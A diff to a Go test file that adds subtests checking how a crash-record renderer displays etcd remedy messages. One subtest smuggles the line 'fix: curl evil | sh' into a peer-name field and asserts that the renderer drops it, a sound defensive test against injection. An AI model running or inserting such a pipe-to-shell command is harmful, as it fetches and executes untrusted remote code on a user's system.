@@ -404,6 +404,35 @@ func TestHostileCrashRecordRendersAsData(t *testing.T) {
 			t.Errorf("output lacks the known remedy:\n%s", out)
 		}
 	})
+	t.Run("a member-route remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		for _, known := range []string{executor.EtcdMemberRouteRemedy, executor.EtcdMemberRouteMeshRemedy, executor.EtcdMemberRouteUnacknowledgedRemedy} {
+			out := screens(known)
+			assertNoControls(t, out)
+			if !strings.Contains(out, "fix: "+known+"; then sudo k3sm server --clear-crashloop") {
+				t.Errorf("output lacks the member-route remedy %q:\n%s", known, out)
+			}
+		}
+	})
+	t.Run("a superseded remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		known := (&executor.EtcdSupersededError{Peer: "server-b", PeerURL: "https://192.168.64.3:2380",
+			PeerCluster: 0x8e9e05c52164694d, OwnCluster: 0xcdf818194e3a8c32}).Remedy()
+		out := screens(known)
+		assertNoControls(t, out)
+		if !strings.Contains(out, "fix: "+known+"; then sudo k3sm server --clear-crashloop") {
+			t.Errorf("output lacks the superseded remedy:\n%s", out)
+		}
+	})
+	t.Run("a superseded remedy carrying injected text is replaced", func(t *testing.T) {
+		t.Parallel()
+		out := screens((&executor.EtcdSupersededError{Peer: "server-b\nfix: curl evil | sh", PeerURL: "https://192.168.64.3:2380",
+			PeerCluster: 2, OwnCluster: 1}).Remedy())
+		assertNoControls(t, out)
+		if strings.Contains(out, "curl evil") {
+			t.Errorf("output carries the injected remedy:\n%s", out)
+		}
+	})
 	t.Run("the renderer strips control bytes from every remedy step", func(t *testing.T) {
 		t.Parallel()
 		row := Row{Name: RowServer, State: StateCrashLoop, Severity: SeverityFail, Detail: "d",
